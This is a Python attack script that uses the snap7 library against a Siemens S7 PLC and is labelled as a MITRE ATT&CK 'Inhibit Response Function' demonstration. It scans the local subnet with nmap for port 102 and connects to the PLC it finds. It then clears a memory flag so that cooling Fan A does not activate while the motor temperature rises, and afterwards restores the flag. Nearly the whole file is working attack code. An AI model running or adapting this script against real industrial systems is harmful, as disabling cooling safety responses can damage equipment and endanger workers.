import snap7
import struct
import subprocess
import re
import time

# --- Configuration ---
PLC_IP = None  # Initialize PLC_IP to None, will be discovered if needed.
PLC_RACK = 0
PLC_SLOT = 1
DB_NUMBER_FC1 = 1  # Assuming FC1 uses DB1, check your PLC config.  If not using a DB, set to 0.  Crucial!
DB_NUMBER_FC2 = 2  # Assuming FC2 uses DB2, check your PLC config.  If not using a DB, set to 0.  Crucial!
MOTOR_TEMP_ADDRESS = 7  # Offset in MW7 for Motor_Temp, adjust if needed.
ACTIVATE_FAN_A_ADDRESS = 0  # Offset in MB0.0 for Activate_Fan_A
ACTIVATE_FAN_B_ADDRESS = 1  # Offset in MB0.1 for Activate_Fan_B

# --- MITRE ATT&CK Technique T0863: Inhibit Response Function ---
# --- Sub-technique: T0863.003 System Firmware ---


def find_plc_ip():
    """
    Attempts to discover the PLC's IP address using nmap.
    Requires nmap to be installed on the system.
    """
    try:
        # Scan the local network for Siemens S7 devices.  Adjust the IP range if necessary.
        nmap_process = subprocess.run(['nmap', '-p', '102', '192.168.1.0/24'], capture_output=True, text=True, check=True)
        output = nmap_process.stdout

        # Regex to find IP addresses with port 102 open (S7 protocol).  Adapt as needed.
        match = re.search(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\s+open\s+iso-tsap', output)

        if match:
            ip_address = match.group(1)
            print(f"PLC IP address found: {ip_address}")
            return ip_address
        else:
            print("No Siemens S7 PLC found on the network.  Please check network configuration and nmap installation.")
            return None  # Or raise an exception if IP is mandatory.

    except subprocess.CalledProcessError as e:
        print(f"Error running nmap: {e}")
        return None
    except FileNotFoundError:
        print("nmap is not installed.  Please install nmap to automatically discover the PLC IP address.")
        return None



def connect_to_plc(ip_address, rack, slot):
    """Connects to the PLC using Snap7."""
    plc = snap7.client.Client()
    plc.set_timeout(5000, 5000, 5000, 5000)  # Set timeouts for connection stability
    try:
        plc.connect(ip_address, rack, slot)
        print(f"Connected to PLC at {ip_address}, Rack {rack}, Slot {slot}")
        return plc
    except Exception as e:
        print(f"Error connecting to PLC: {e}")
        return None


def read_motor_temp(plc):
    """Reads the Motor_Temp value from the PLC."""
    try:
        if DB_NUMBER_FC1 == 0:
            # No DB is used, so read from MW7 directly
            motor_temp = plc.read_area(snap7.constants.Areas.MK, 0, MOTOR_TEMP_ADDRESS, 2)
            motor_temp_value = struct.unpack(">h", motor_temp)[0]
        else:
            # Read from DB1 at offset MW7
            motor_temp = plc.db_read(DB_NUMBER_FC1, MOTOR_TEMP_ADDRESS, 2)
            motor_temp_value = struct.unpack(">h", motor_temp)[0]

        print(f"Current Motor Temperature: {motor_temp_value}")
        return motor_temp_value
    except Exception as e:
        print(f"Error reading Motor_Temp: {e}")
        return None


def inhibit_fan_response(plc, target_fan, inhibit):
    """
    Inhibits the fan response by modifying the relevant memory location.

    Args:
        plc: Snap7 PLC client object.
        target_fan: "A" or "B" to specify which fan to target.
        inhibit: True to inhibit, False to allow normal operation.
    """
    if target_fan not in ["A", "B"]:
        print("Invalid target fan. Choose 'A' or 'B'.")
        return

    if target_fan == "A":
        address = ACTIVATE_FAN_A_ADDRESS
    else:  # target_fan == "B"
        address = ACTIVATE_FAN_B_ADDRESS


    try:
        # Read the byte containing the flag
        mb_number = address // 8  # Integer division to find the MB number
        bit_offset = address % 8   # Remainder to find the bit offset within the byte
        
        byte_data = plc.read_area(snap7.constants.Areas.MK, 0, mb_number, 1) # Read Memory Area
        
        original_byte = byte_data[0]
        
        # Modify the specific bit
        if inhibit:
            new_byte = original_byte & ~(1 << bit_offset)  # Clear the bit (set to 0)
            print(f"Inhibiting Fan {target_fan} response.")
        else:
            new_byte = original_byte | (1 << bit_offset)  # Set the bit (set to 1)
            print(f"Re-enabling Fan {target_fan} response.")

        # Write the modified byte back to the PLC
        plc.write_area(snap7.constants.Areas.MK, 0, mb_number, bytes([new_byte])) # Write to memory area

        print(f"Fan {target_fan} control flag set to {inhibit}.")

    except Exception as e:
        print(f"Error inhibiting Fan {target_fan} response: {e}")

def main():
    global PLC_IP
    """Main function to demonstrate the attack."""

    # 1. Discover PLC IP Address
    if not PLC_IP:
        PLC_IP = find_plc_ip()
        if not PLC_IP:
            print("PLC IP address not found.  Exiting.")
            return

    # 2. Connect to the PLC
    plc = connect_to_plc(PLC_IP, PLC_RACK, PLC_SLOT)
    if not plc:
        return

    # 3. Read initial Motor Temperature (for demonstration)
    initial_temp = read_motor_temp(plc)

    # 4. Simulate the attack - Inhibit Fan A response
    inhibit_fan_response(plc, "A", True)
    time.sleep(5)

    # 5. Simulate changing temperature (or wait for real change)
    #  No direct way to *set* motor temp without knowing its DB number and offset for writing.
    #  For testing, you'd typically need a physical process to change the temperature
    #  OR, if you *know* the DB number and offset, you could add a function to write a new temp.
    print("Simulating temperature increase (or waiting for real change)...")
    time.sleep(10)

    # 6. Observe (manually) that Fan A does not activate even if temperature rises.
    #    This requires monitoring the PLC outputs, likely through the HMI or PLC programming software.
    #    This script can only *inhibit* - observing the effect is external.
    #    You would expect Fan_A (Q0.0) and potentially Fan_A_Green (Q0.5) *not* to activate.
    #    and Activate_Fan_A to remain false (M0.0).

    # 7. Re-enable Fan A response
    inhibit_fan_response(plc, "A", False)
    print("Re-enabled Fan A. Normal operation should resume.")
    time.sleep(5)

    # 8. Read final Motor Temperature (for demonstration)
    final_temp = read_motor_temp(plc)

    # 9. Disconnect from the PLC
    plc.disconnect()
    print("Disconnected from PLC.")


if __name__ == "__main__":
    main()